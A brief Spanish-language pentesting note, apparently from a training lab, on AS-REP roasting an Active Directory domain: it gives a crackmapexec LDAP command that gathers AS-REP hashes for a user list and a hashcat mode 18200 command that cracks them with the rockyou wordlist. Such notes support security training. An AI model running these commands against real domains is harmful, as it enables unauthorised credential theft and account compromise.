### Para enumerar ASProast users debemos usar LDAP

Debemos agregar al DC a nuestro archivo hosts con el nombre completo, de otra manera nos dará un error:

    dc.domain.local

Luego podemos enumerar

    crackmapexec ldap dc01.inlanefreight.htb -u users.txt -p '' --asreproast asreproast.out

### Crackeamos

    hashcat -m 18200 asreproast.out /usr/share/wordlists/rockyou.txt
